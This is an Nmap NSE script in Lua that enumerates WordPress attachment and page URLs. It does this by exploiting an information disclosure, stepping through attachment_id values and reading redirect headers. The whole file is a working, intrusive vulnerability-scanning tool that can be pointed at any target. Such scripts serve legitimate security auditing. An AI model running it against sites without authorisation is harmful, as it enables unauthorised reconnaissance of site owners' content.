local http = require "http"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Enumerates URLs of uploaded media and pages in Wordpress blog/CMS installations by exploiting an information disclosure vulnerability.

$ git clone https://github.com/hkm/nmap-nse-scripts.git

Original advisory:
* http://blog.whitehatsec.com/information-leakage-in-wordpress/#.Ueig9m0_yms
]]

---
-- @usage
-- nmap -p80 --script http-wordpress-attachment <target>
-- nmap -sV --script http-wordpress-attachment --script-args limit=1000 <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-wordpress-attachment:
-- | URL: http://www.hakim.ws/calendario/
-- | URL: http://www.hakim.ws/2010/12/noticias-anteriores-al-201/
-- |_Search stopped at ID #25. Increase the upper limit if necessary with '--script-args limit=1000'
-- 
-- @args http-wordpress-attachment.limit Upper limit for ID search. Default: 100
-- @args http-wordpress-attachment.basepath Base path to Wordpress. Default: /
-- @args http-wordpress-attachment.out If set it saves the URL list in this file.
---

author = "Pedro Joaquin based on Paulino Calderon http-wordpress-enum"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"auth", "intrusive", "vuln"}


portrule = shortport.http

---
-- Returns the URL extracted from the Location corresponding to the attachment_id passed
-- If attachment_id doesn't exists returns false
-- @param host Host table
-- @param port Port table
-- @param path Base path to WP
-- @param id Attachment id
-- @return false if not found otherwise it returns the username
---
local function get_wp_url(host, port, path, id)
  stdnse.print_debug(2, "%s: Trying to get URL with attachment_id %s", SCRIPT_NAME, id)
  local req = http.get(host, port, path.."?attachment_id="..id, {no_cache = true, redirect_ok = false})
  if req.status == 301 then
    	if string.find(req.header.location, "attachment_id") == nil then
      		stdnse.print_debug(1, "Attachment_id #%s returned %s", id, req.header.location)
      		return req.header.location
      	end
  end
  return false
end

---
--Returns true if WP installation exists.
--We assume an installation exists if wp-content is found in body of index.php
--@param host Host table
--@param port Port table
--@param path Path to WP
--@return True if 404 page contains string wp-content
--
local function check_wp(host, port, path)
  stdnse.print_debug(2, "Checking wp-content in body")
  local req = http.get(host, port, path..math.random(1, 99999999), {no_cache = true})
  if req.status == 404 then
    if string.find(tostring(req.body), "wp%-content") ~= nil then
    	stdnse.print_debug(1, "Wordpress installation detected. String wp-content found in 404 body")
    	return true
    end
  end
  return false
end

---
--Writes string to file
--Taken from: hostmap.nse
--@param filename Target filename
--@param contents String to save
--@return true when successful
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end


---
--MAIN
---
action = function(host, port)
  local basepath = stdnse.get_script_args("http-wordpress-attachment.basepath") or "/"
  local limit = stdnse.get_script_args("http-wordpress-attachment.limit") or 100
  local filewrite = stdnse.get_script_args("http-wordpress-attachment.out")
  local output = {""}
  local users = {}

 --First, we check this is WP
  if not(check_wp(host, port, basepath)) then
    if nmap.verbosity() >= 2 then
      return "[Error] Wordpress installation was not found. We couldn't find wp-content"
    else
      return
    end
  end

  --Incrementing ids to enum URLs
  for i=1, tonumber(limit) do
    local user = get_wp_url(host, port, basepath, i)
    if user then
      output[#output+1] = string.format("URL: %s", user)
      users[#users+1] = user
    end
  end

  if filewrite and #users>0 then
    local status, err = write_file(filewrite,  stdnse.strjoin("\n", users))
    if status then
      output[#output+1] = string.format("URLs saved to %s\n", filewrite)
    else
      output[#output+1] = string.format("Error saving %s: %s\n", filewrite, err)
    end
  end
 
  if #output > 1 then
    output[#output+1] = string.format("Search stopped at ID #%s. Increase the upper limit if necessary with 'http-wordpress-attachment.limit'", limit)
    return stdnse.strjoin("\n", output)
  end
end
